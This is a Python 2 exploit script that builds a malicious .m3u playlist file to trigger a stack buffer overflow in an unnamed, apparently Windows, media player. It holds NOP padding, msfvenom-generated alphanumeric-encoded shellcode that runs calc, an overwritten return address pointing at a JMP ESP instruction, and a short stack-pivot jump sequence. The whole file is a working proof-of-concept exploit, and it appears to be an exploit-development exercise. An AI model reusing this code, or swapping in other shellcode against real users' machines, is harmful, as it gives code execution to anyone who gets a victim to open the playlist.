#!/usr/bin/env python
import struct
outfile = 'popcalc_exploit_small_buf.m3u'
bufsz = 26064

# Just some junk at the beginning
junk = '\x90' * 200
nop = '\x90' * 50

# msfvenom -p windows/exec CMD=calc -f python -e x86/alpha_upper 
shellcode = ""
shellcode += "\x89\xe6\xda\xd5\xd9\x76\xf4\x5f\x57\x59\x49\x49"
shellcode += "\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54"
shellcode += "\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48"
shellcode += "\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41"
shellcode += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
shellcode += "\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4d\x38\x4c"
shellcode += "\x42\x43\x30\x53\x30\x55\x50\x43\x50\x4c\x49\x5a"
shellcode += "\x45\x30\x31\x39\x50\x55\x34\x4c\x4b\x36\x30\x46"
shellcode += "\x50\x4c\x4b\x56\x32\x44\x4c\x4c\x4b\x56\x32\x45"
shellcode += "\x44\x4c\x4b\x54\x32\x56\x48\x54\x4f\x48\x37\x31"
shellcode += "\x5a\x46\x46\x56\x51\x4b\x4f\x4e\x4c\x37\x4c\x35"
shellcode += "\x31\x53\x4c\x35\x52\x56\x4c\x57\x50\x4f\x31\x38"
shellcode += "\x4f\x44\x4d\x55\x51\x59\x57\x5a\x42\x4b\x42\x30"
shellcode += "\x52\x31\x47\x4c\x4b\x56\x32\x32\x30\x4c\x4b\x51"
shellcode += "\x5a\x37\x4c\x4c\x4b\x30\x4c\x44\x51\x34\x38\x4a"
shellcode += "\x43\x50\x48\x55\x51\x4e\x31\x30\x51\x4c\x4b\x36"
shellcode += "\x39\x31\x30\x43\x31\x49\x43\x4c\x4b\x31\x59\x45"
shellcode += "\x48\x4d\x33\x36\x5a\x37\x39\x4c\x4b\x56\x54\x4c"
shellcode += "\x4b\x45\x51\x59\x46\x30\x31\x4b\x4f\x4e\x4c\x39"
shellcode += "\x51\x38\x4f\x44\x4d\x35\x51\x58\x47\x36\x58\x4d"
shellcode += "\x30\x32\x55\x4a\x56\x35\x53\x53\x4d\x5a\x58\x37"
shellcode += "\x4b\x43\x4d\x47\x54\x33\x45\x4b\x54\x51\x48\x4c"
shellcode += "\x4b\x46\x38\x31\x34\x35\x51\x39\x43\x43\x56\x4c"
shellcode += "\x4b\x44\x4c\x50\x4b\x4c\x4b\x50\x58\x35\x4c\x45"
shellcode += "\x51\x58\x53\x4c\x4b\x54\x44\x4c\x4b\x33\x31\x4e"
shellcode += "\x30\x4c\x49\x50\x44\x36\x44\x31\x34\x31\x4b\x31"
shellcode += "\x4b\x43\x51\x50\x59\x30\x5a\x36\x31\x4b\x4f\x4b"
shellcode += "\x50\x51\x4f\x51\x4f\x30\x5a\x4c\x4b\x52\x32\x4a"
shellcode += "\x4b\x4c\x4d\x31\x4d\x32\x4a\x33\x31\x4c\x4d\x4d"
shellcode += "\x55\x4f\x42\x35\x50\x33\x30\x35\x50\x30\x50\x45"
shellcode += "\x38\x36\x51\x4c\x4b\x52\x4f\x4d\x57\x4b\x4f\x49"
shellcode += "\x45\x4f\x4b\x4a\x50\x4e\x55\x39\x32\x51\x46\x43"
shellcode += "\x58\x39\x36\x5a\x35\x4f\x4d\x4d\x4d\x4b\x4f\x39"
shellcode += "\x45\x57\x4c\x33\x36\x33\x4c\x44\x4a\x4b\x30\x4b"
shellcode += "\x4b\x4b\x50\x53\x45\x33\x35\x4f\x4b\x47\x37\x45"
shellcode += "\x43\x42\x52\x52\x4f\x42\x4a\x45\x50\x50\x53\x4b"
shellcode += "\x4f\x48\x55\x53\x53\x55\x31\x42\x4c\x53\x53\x33"
shellcode += "\x30\x41\x41"

# Add some more padding
rest = '\x90' * (bufsz - (len(junk) + len(nop) + len(shellcode)))


#01AAF23A   FFE4             JMP ESP

eip = struct.pack("<L",0x01AAF23A)

# Some filler
presc = 'C' * 4

# add esp, 0x5e
# add esp, 0x5e
# jmp esp

"""
 nasm > add esp, 0x5e
00000000  83C45E            add esp,byte +0x5e
nasm > add esp, 0x5e
00000000  83C45E            add esp,byte +0x5e
nasm > jmp esp
00000000  FFE4              jmp esp
"""

jumpcode =  ""
jumpcode += "\x83\xc4\x5e"
jumpcode += "\x83\xc4\x5e"
jumpcode += "\xff\xe4"

# Final payload
payload = junk + nop + shellcode + rest + eip + presc + jumpcode

with open(outfile, 'w') as f:
	f.write(payload)
print 'Wrote %u bytes to %s' % (len(payload), outfile)